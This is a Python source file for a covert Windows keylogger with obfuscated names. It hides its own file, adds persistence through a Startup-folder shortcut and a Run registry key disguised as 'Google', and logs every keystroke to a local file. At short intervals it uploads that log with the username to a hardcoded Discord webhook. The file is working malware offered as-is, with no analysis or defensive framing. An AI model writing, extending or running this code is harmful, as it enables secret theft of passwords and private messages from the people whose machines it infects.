import os, time, ctypes,requests, winreg,win32com.client,sys
from pynput import keyboard


vVbSdP_jM = 'https://discord.com/api/webhooks/1188180601996587168/YKw8ZWYZqyPaYoCAMmnRJsFCUMryzLJvVh81Vg2Xr5r-G-UeCewQssrAmsrUW20pU3fv'
LmWgYm_E = ""
aBcD_eFgH = 5 
xYzZaB_cD = sys.argv[0] 
os.system(f"attrib +h {xYzZaB_cD}")  
os.chmod(xYzZaB_cD, 0o0700)
qqwwee = os.environ.get('USERNAME')
ppooww = f'C:/Users/{qqwwee}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'

lOg_PaTh = f"C:/Users/{qqwwee}/Documents/log.txt" 

lkasdmq = os.path.join(ppooww, "log.lnk")

shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(lkasdmq)
shortcut.Targetpath = xYzZaB_cD
shortcut.Save()


def wowowow(lkasdmq): 
    user = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(user, "Google", 0, winreg.REG_SZ, f"{lkasdmq}") 
def lmlmlmdd(vVbSdP_jM, file_path): 
    with open(file_path, 'rb') as file:
        xayah = {"content": f"User: {qqwwee}"}
        pwet = {'file': (file_path, file)}
        poops = requests.post(vVbSdP_jM, data=xayah, files=pwet)
        if poops.status_code == 200:
            file.close()

def rakan(): 
    global LmWgYm_E
    if LmWgYm_E:
        
        nothing = os.path.getsize(lOg_PaTh) / (1024 * 1024)  

        if nothing >= 2 and lalamove == 0 :
            lmlmlmdd(vVbSdP_jM, lOg_PaTh)
            os.remove(lOg_PaTh)

        else:
            lmlmlmdd(vVbSdP_jM, lOg_PaTh)

        LmWgYm_E = ""
    return
def shopee():
    return ctypes.windll.user32.GetKeyState(0x14)

def lazada(key): 
    powerranger = {
        keyboard.Key.backspace: "\n [BackSpace]\n",
        keyboard.Key.enter: "\n [Enter]\n",
        keyboard.Key.space: " ",
        keyboard.Key.ctrl_l: "\n [Ctrl]\n",
    }
    
    if key in powerranger:
        pass

        return powerranger[key]

    if key == keyboard.Key.caps_lock:
        walato = "[CAPSLOCK ON]" if shopee() else "[CAPSLOCK OFF]"

    return None

def powerpopgirl(key): 
    numpad_key_mapping = {
        96: "0",
        97: "1",
        98: "2",
        99: "3",
        100: "4",
        101: "5",
        102: "6",
        103: "7",
        104: "8",
        105: "9",
        106: "10",
   
    }

    if hasattr(key, 'vk') and key.vk in numpad_key_mapping:
        return numpad_key_mapping[key.vk]

def inchanpogi(key): 
    try:
        char = format(key.char)
        walato = shopee()

        if walato:
            char = char.upper()
        elif keyboard.Key.shift:
            pass
        else:
            char = char.lower()
        
        return char
    except AttributeError:

        return None

def pogiko(key):
    global LmWgYm_E

    with open(lOg_PaTh, 'a') as log_file:
        kiffy = lazada(key)
        gwapoko = powerpopgirl(key)

        if kiffy is not None:
            log_file.write(kiffy)
            LmWgYm_E += kiffy
        elif gwapoko is not None:
            log_file.write(gwapoko)
            LmWgYm_E += gwapoko
        else:
            hulaan = inchanpogi(key)
            if hulaan is not None:
                log_file.write(hulaan)
                LmWgYm_E += hulaan


# The following line was missing in my previous responses
keyboard.Listener(on_press=pogiko)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pogiko)
    wowowow(lkasdmq)
    listener.start()
    
   
    try:    

        while True:

            wiw = time.time()

            while True:
                lolsskie = time.time() - wiw
                lalamove = max(0, aBcD_eFgH - lolsskie)
                print(f"Time remaining: {lalamove:.1f} seconds")
                if lalamove == 0:
                    rakan()
                    break

                time.sleep(1)  

            print("\nTimer finished. Restarting...\n")
            

    except:
        pass
    finally:
        listener.stop()
        listener.join()



